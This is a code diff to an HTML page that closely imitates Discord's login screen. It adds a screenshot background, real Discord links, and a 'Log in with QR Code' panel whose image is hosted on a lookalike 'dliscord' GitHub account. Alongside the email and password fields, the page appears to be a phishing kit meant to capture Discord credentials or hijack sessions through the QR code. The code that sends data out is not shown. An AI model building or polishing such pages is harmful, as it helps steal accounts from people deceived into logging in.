@@ -7,7 +7,7 @@
   <style>
     /* Discord styles */
     body {
-      background-image: url('https://raw.githubusercontent.com/X1vova1X/pngs/main/bg.png');
+      background-image: url('https://preview.redd.it/new-and-slightly-older-discord-login-screen-as-a-png-v0-nnd20frfve3d1.png?width=1080&crop=smart&auto=webp&s=01c1946d78486a0c1569c098f2dd53a4d7a39df2');
       background-size: cover;
       background-repeat: no-repeat;
       color: #dcddde;
@@ -24,8 +24,10 @@
       border-radius: 5px;
       padding: 30px;
       box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
-      width: 400px;
+      width: 900px; /* Increased width to accommodate the QR code */
       position: relative;
+      display: flex; /* Added to enable positioning the QR code */
+      align-items: center; /* Added to vertically center the content */
     }
     .login-box h2 {
       text-align: center;
@@ -55,16 +57,39 @@
       border-radius: 3px;
       cursor: pointer;
     }
+    .qr-code {
+      margin-left: 125px; /* Added to position the QR code to the right */
+      width: 200px;
+      height: 300px;
+    }
+    .qr-code img {
+      width: 200px;
+      height: 200px;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
   <div class="login-container">
     <div class="login-box">
-      <h2>Welcome back!</h2>
-      <p>We're so excited to see you again!</p>
-      <input type="text" id="username" placeholder="Email address or phone number" />
-      <input type="password" id="password" placeholder="Password" />
-      <button onclick="login()">Login</button>
+      <div class="login-form">
+        <h2>Welcome back!</h2>
+        <p>We're so excited to see you again!</p>
+        <input type="text" id="username" placeholder="Email address or phone number" />
+        <input type="password" id="password" placeholder="Password" />
+        <a href="https://discord.com/login" style="color: rgb(96, 96, 255); text-decoration: none;">Forgot your password?</a>
+        <p> </p>
+        <button onclick="login()">Login</button>
+        <p> </p>
+        <span>Need an account? <a href="https://discord.com/register" style="color: rgb(96, 96, 255); text-decoration: none;">Register</a></span>
+      </div>
+      <div class="qr-code">
+        <img src="https://github.com/dliscord/dliscord.github.io/blob/main/discord%20qr.png?raw=true" alt="QR Code">
+        <h3>Log in with QR Code</h3>
+        <p>Scan this with the Discord mobile app to log in instantly.</p>
+      </div>
     </div>
   </div>
 
